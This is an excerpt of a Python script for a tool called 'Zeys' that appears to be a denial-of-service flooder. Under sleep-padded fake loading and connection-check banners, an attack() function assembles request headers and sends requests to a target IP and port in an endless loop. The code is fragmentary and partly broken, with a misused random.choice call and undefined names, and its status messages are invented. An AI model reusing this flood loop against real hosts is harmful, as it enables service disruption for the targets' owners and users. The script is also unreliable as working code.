...
print("Opening Tools Loading 1-30")
time.sleep(10)
print(" ")
print(" ")
print(" ")
...
time.sleep(2)
print("======================")
print("[=] Check Zeys Connection [=]")
print("======================")
time.sleep(10)
print("[✓] Connection Good")
time.sleep(1)
print("[×]WARNING THIS TOOLS NOT TESTED AND SO MANY VIRUS[×]")
print("                          ")
time.sleep(3)
print(" ")
print(" ")
...
def killed():
	killed = "Killed: " + header + forward + request + data + Mozila + "\r\n"
	dataKilled = "datKilled: " + random.choice(accept,referer) + "\r\n"
...
def attack():
    ...
    header = get_data + referer + forward + useragent + accept + lcontent + connection +  length + Mozila + "\r\n\r\n"
    ...
    while True:
        try:
            ...
            for x in range(times):
                ...
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
            print(f"Zeys Request send => {ip} With Port => {port}")
            time.sleep(2)
        except :
            print(f"Zeys Request send => {ip} With Port => {port}")
            time.sleep(2)
